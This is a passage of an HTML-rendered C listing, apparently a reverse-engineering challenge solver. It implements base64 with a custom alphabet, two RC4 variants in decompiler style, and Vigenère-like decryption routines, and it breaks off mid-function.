class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str0)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* str = (<span class="type">unsigned</span> <span class="type">char</span>*)str0;<span class="comment">//转为unsigned char无符号,移位操作时可以防止错误</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> base64_map[] = <span class="string">&quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;</span>;<span class="comment">//数组形式,方便修改</span></span><br><span class="line"><span class="type">long</span> len;<span class="comment">//base64处理后的字符串长度</span></span><br><span class="line"><span class="type">long</span> str_len;<span class="comment">//源字符串长度</span></span><br><span class="line"><span class="type">long</span> flag;<span class="comment">//用于标识模3后的余数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* res;<span class="comment">//返回的字符串</span></span><br><span class="line">str_len = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)str);</span><br><span class="line"><span class="keyword">switch</span> (str_len % <span class="number">3</span>)<span class="comment">//判断模3的余数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:flag = <span class="number">0</span>; len = str_len / <span class="number">3</span> * <span class="number">4</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:flag = <span class="number">1</span>; len = (str_len / <span class="number">3</span> + <span class="number">1</span>) * <span class="number">4</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:flag = <span class="number">2</span>; len = (str_len / <span class="number">3</span> + <span class="number">1</span>) * <span class="number">4</span>; <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * len + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; str_len - flag; j += <span class="number">3</span>, i += <span class="number">4</span>)<span class="comment">//先处理整除部分</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//注意&amp;运算和位移运算的优先级,是先位移后与或非</span></span><br><span class="line">res[i] = base64_map[str[j] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">res[i + <span class="number">1</span>] = base64_map[(str[j] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span> | str[j + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>];</span><br><span class="line">res[i + <span class="number">2</span>] = base64_map[(str[j + <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span> | (str[j + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">res[i + <span class="number">3</span>] = base64_map[str[j + <span class="number">2</span>] &amp; <span class="number">0x3f</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不满足被三整除时,要矫正</span></span><br><span class="line"><span class="keyword">switch</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="keyword">break</span>;<span class="comment">//满足时直接退出</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:res[len - <span class="number">4</span>] = base64_map[str[str_len - <span class="number">1</span>] &gt;&gt; <span class="number">2</span>];<span class="comment">//只剩一个字符时,右移两位得到高六位</span></span><br><span class="line">res[len - <span class="number">3</span>] = base64_map[(str[str_len - <span class="number">1</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>];<span class="comment">//获得低二位再右移四位,自动补0</span></span><br><span class="line">res[len - <span class="number">2</span>] = res[len - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>; <span class="keyword">break</span>;<span class="comment">//最后两个补=</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">res[len - <span class="number">4</span>] = base64_map[str[str_len - <span class="number">2</span>] &gt;&gt; <span class="number">2</span>];<span class="comment">//剩两个字符时,右移两位得高六位</span></span><br><span class="line">res[len - <span class="number">3</span>] = base64_map[(str[str_len - <span class="number">2</span>] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span> | str[str_len - <span class="number">1</span>] &gt;&gt; <span class="number">4</span>];<span class="comment">//第一个字符低二位和第二个字符高四位</span></span><br><span class="line">res[len - <span class="number">2</span>] = base64_map[(str[str_len - <span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span>];<span class="comment">//第二个字符低四位,左移两位自动补0</span></span><br><span class="line">res[len - <span class="number">1</span>] = <span class="string">&#x27;=&#x27;</span>;<span class="comment">//最后一个补=</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res[len] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//补上字符串结束标识</span></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">findPos</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* base64_map, <span class="type">unsigned</span> <span class="type">char</span> c)</span><span class="comment">//查找下标所在位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)base64_map); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (base64_map[i] == c)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">base64_decode</span><span class="params">(<span class="type">char</span>* code0)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* code = (<span class="type">unsigned</span> <span class="type">char</span>*)code0;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> base64_map[] = <span class="string">&quot;stuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr&quot;</span>;</span><br><span class="line"><span class="type">long</span> len, str_len, flag = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>* res;</span><br><span class="line">len = <span class="built_in">strlen</span>((<span class="type">char</span>*)code);</span><br><span class="line"><span class="keyword">if</span> (code[len - <span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (code[len - <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">2</span>;</span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">str_len = len / <span class="number">4</span> * <span class="number">3</span>;</span><br><span class="line">res = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * str_len + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; str_len - flag; j += <span class="number">3</span>, i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">4</span>];</span><br><span class="line">a[<span class="number">0</span>] = findPos(base64_map, code[i]);<span class="comment">//code[]每一个字符对应base64表中的位置,用位置值反推原始数据值</span></span><br><span class="line">a[<span class="number">1</span>] = findPos(base64_map, code[i + <span class="number">1</span>]);</span><br><span class="line">a[<span class="number">2</span>] = findPos(base64_map, code[i + <span class="number">2</span>]);</span><br><span class="line">a[<span class="number">3</span>] = findPos(base64_map, code[i + <span class="number">3</span>]);</span><br><span class="line">res[j] = a[<span class="number">0</span>] &lt;&lt; <span class="number">2</span> | a[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>;<span class="comment">//取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  </span></span><br><span class="line">res[j + <span class="number">1</span>] = a[<span class="number">1</span>] &lt;&lt; <span class="number">4</span> | a[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>;<span class="comment">//取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  </span></span><br><span class="line">res[j + <span class="number">2</span>] = a[<span class="number">2</span>] &lt;&lt; <span class="number">6</span> | a[<span class="number">3</span>];   <span class="comment">//取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> a[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">&#123;</span><br><span class="line">a[<span class="number">0</span>] = findPos(base64_map, code[len - <span class="number">4</span>]);</span><br><span class="line">a[<span class="number">1</span>] = findPos(base64_map, code[len - <span class="number">3</span>]);</span><br><span class="line">res[str_len - <span class="number">1</span>] = a[<span class="number">0</span>] &lt;&lt; <span class="number">2</span> | a[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">a[<span class="number">0</span>] = findPos(base64_map, code[len - <span class="number">4</span>]);</span><br><span class="line">a[<span class="number">1</span>] = findPos(base64_map, code[len - <span class="number">3</span>]);</span><br><span class="line">a[<span class="number">2</span>] = findPos(base64_map, code[len - <span class="number">2</span>]);</span><br><span class="line">res[str_len - <span class="number">2</span>] = a[<span class="number">0</span>] &lt;&lt; <span class="number">2</span> | a[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">res[str_len - <span class="number">1</span>] = a[<span class="number">1</span>] &lt;&lt; <span class="number">4</span> | a[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">res[str_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(code0, res, str_len);</span><br><span class="line"><span class="keyword">return</span> str_len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">rc41</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* a1, <span class="type">const</span> <span class="type">char</span>* a2, <span class="type">unsigned</span> <span class="type">int</span>* a3, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">__int64 v3; <span class="comment">// kr00_8</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-438h]</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [rsp+20h] [rbp-438h]</span></span><br><span class="line"><span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-438h]</span></span><br><span class="line"><span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-434h]</span></span><br><span class="line"><span class="type">int</span> v8; <span class="comment">// [rsp+24h] [rbp-434h]</span></span><br><span class="line"><span class="type">int</span> k; <span class="comment">// [rsp+28h] [rbp-430h]</span></span><br><span class="line"><span class="type">int</span> v10; <span class="comment">// [rsp+30h] [rbp-428h]</span></span><br><span class="line"><span class="type">int</span> v11; <span class="comment">// [rsp+34h] [rbp-424h]</span></span><br><span class="line"><span class="type">int</span> v12[<span class="number">258</span>]; <span class="comment">// [rsp+50h] [rbp-408h]</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">&#123;</span><br><span class="line">a3[i] = a1[i];</span><br><span class="line">&#125;</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">v12[i] = i;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">v3 = a2[j % <span class="built_in">strlen</span>(a2)] + v12[j] + v7;</span><br><span class="line">v7 = v3 % <span class="number">256</span>;</span><br><span class="line">v10 = v12[j];</span><br><span class="line">v12[j] = v12[v7];</span><br><span class="line">v12[v7] = v10;</span><br><span class="line">&#125;</span><br><span class="line">v8 = <span class="number">0</span>;</span><br><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;size; ++k)</span><br><span class="line">&#123;</span><br><span class="line">v6 = (v6 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v8 = (v12[v6] + v8) % <span class="number">256</span>;</span><br><span class="line">v11 = v12[v6];</span><br><span class="line">v12[v6] = v12[v8];</span><br><span class="line">v12[v8] = v11;</span><br><span class="line">a1[k] = v12[(v12[v6] + v12[v8]) % <span class="number">256</span>] ^ (a3[k] - <span class="number">57</span> + <span class="number">256</span>) % <span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">rc42</span><span class="params">(<span class="type">char</span>* a1, <span class="type">const</span> <span class="type">char</span>* a2, <span class="type">int</span>* a3, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">__int64 v3; <span class="comment">// kr00_8</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-438h]</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [rsp+20h] [rbp-438h]</span></span><br><span class="line"><span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-438h]</span></span><br><span class="line"><span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-434h]</span></span><br><span class="line"><span class="type">int</span> v8; <span class="comment">// [rsp+24h] [rbp-434h]</span></span><br><span class="line"><span class="type">int</span> k; <span class="comment">// [rsp+28h] [rbp-430h]</span></span><br><span class="line"><span class="type">int</span> v10; <span class="comment">// [rsp+30h] [rbp-428h]</span></span><br><span class="line"><span class="type">int</span> v11; <span class="comment">// [rsp+34h] [rbp-424h]</span></span><br><span class="line"><span class="type">int</span> v12[<span class="number">258</span>]; <span class="comment">// [rsp+50h] [rbp-408h]</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">&#123;</span><br><span class="line">a3[i] = a1[i];</span><br><span class="line">&#125;</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">v12[i] = i;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">v3 = a2[j % <span class="built_in">strlen</span>(a2)] + v12[j] + v7;</span><br><span class="line">v7 = v3 % <span class="number">256</span>;</span><br><span class="line">v10 = v12[j];</span><br><span class="line">v12[j] = v12[v7];</span><br><span class="line">v12[v7] = v10;</span><br><span class="line">&#125;</span><br><span class="line">v8 = <span class="number">0</span>;</span><br><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; size; ++k)</span><br><span class="line">&#123;</span><br><span class="line">v6 = (v6 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v8 = (v12[v6] + v8) % <span class="number">256</span>;</span><br><span class="line">v11 = v12[v6];</span><br><span class="line">v12[v6] = v12[v8];</span><br><span class="line">v12[v8] = v11;</span><br><span class="line">a1[k] = v12[(v12[v8] + v12[v6]) % <span class="number">256</span>] ^ a3[k] ^ <span class="number">0x39</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_case1</span><span class="params">(<span class="type">char</span>* a1, <span class="type">const</span> <span class="type">char</span>* a2)</span> &#123;</span><br><span class="line"><span class="type">int</span> lena1 = <span class="built_in">strlen</span>(a1);</span><br><span class="line"><span class="type">int</span> lena2 = <span class="built_in">strlen</span>(a2);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lena1; ++i) &#123;</span><br><span class="line"><span class="type">int</span> key = a2[i % lena2];</span><br><span class="line"><span class="keyword">if</span> (a1[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; a1[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">a1[i] = (a1[i] - (key % <span class="number">26</span>) - <span class="string">&#x27;A&#x27;</span> + <span class="number">26</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a1[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; a1[i] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">a1[i] = (a1[i] - (key % <span class="number">26</span>) - <span class="string">&#x27;a&#x27;</span> + <span class="number">26</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a1[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; a1[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">a1[i] = (a1[i] - (key % <span class="number">10</span>) - <span class="string">&#x27;0&#x27;</span> + <span class="number">10</span>) % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_case2</span><span class="params">(<span class="type">char</span>* a1, <span class="type">const</span> <span class="type">char</span>* a2)</span> &#123;</span><br><span class="line"><span class="type">int</span> num_inv[] = &#123; <span class="number">1</span>,<span class="number">9</span>,<span class="number">21</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">25</span> &#125;;</span><br><span class="line"><span class="type">int</span> lena1 = <span class="built_in">strlen</span>(a1);</span><br><span class="line"><span class="type">int</span> lena2 = <span class="built_in">strlen</span>(a2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; lena1; ++j) &#123;</span><br><span class="line"><span class="type">char</span> base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (a1[j] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; a1[j] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">base = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a1[j] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; a1[j] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">base = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> inv = num_inv[j % <span class="number">12</span>];</span><br><span class="line"><span class="type">int</span> shift = a2[j % lena2];</span><br><span class="line"><span class="type">int</span> val = (a1[j] - base - shift + <span 